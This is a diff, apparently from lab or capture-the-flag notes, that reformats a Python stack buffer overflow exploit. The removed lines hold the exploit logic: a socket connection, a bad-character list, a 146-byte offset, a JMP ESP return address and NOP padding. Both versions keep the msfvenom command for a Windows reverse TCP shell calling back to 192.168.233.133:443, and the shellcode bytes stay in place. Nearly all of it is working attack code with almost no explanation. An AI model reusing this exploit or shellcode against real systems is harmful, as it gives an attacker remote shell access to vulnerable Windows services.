@@ -1,16 +1,9 @@
-import socket
 
-ip = "localhost"
-port = 31337
-
-allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
-badchars = ""
-usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars
-#print(''.join(f'\\x{ord(c):02x}' for c in usechars))
-
-# *** Kali VM IP Adress ***
-# msfvenom -p 'windows/shell_reverse_tcp' LHOST=192.168.233.133 LPORT=443 -f 'python'
-# Payload size: 324 bytes
+```sh
+msfvenom -p 'windows/shell_reverse_tcp' LHOST=192.168.233.133 LPORT=443 -f 'python'
+...
+Payload size: 324 bytes
+...
 buf =  ""
 buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
 buf += "\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
@@ -39,38 +32,4 @@ buf += "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
 buf += "\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
 buf += "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
 buf += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
-
-prefix = ""
-offset = 146
-overflow = "A" * offset
-retn = "\x88\x1A\x9B\x00" #"\xdf\x14\x50\x62" #625014DF - pos of "JMP ESP", "CALL ESP" or "PUSH ESP; RET"
-padding = "\x90" * 16  #space to expand in
-
-#payload = "A" * 256 #for knowing where the data is before finding badchars
-#payload = usechars
-payload = buf
-
-
-postfix = "\x90" * 16  #space to expand in
-
-buffer = prefix + overflow + retn + padding + payload + postfix
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-try:
-  s.connect((ip, port))
-
-  #print(s.recv(1024))
-  
-  #This one uses a "login", really the user name
-  #print("Sending user name")
-  #s.send(bytes("username123", "latin-1"))
-
-  #print(s.recv(1024))
-
-  
-  print("Sending ...")
-  s.send(bytes(buffer + "\r\n", "latin-1"))
-  print("Done!")
-except:
-  print("Could not connect.")
+```
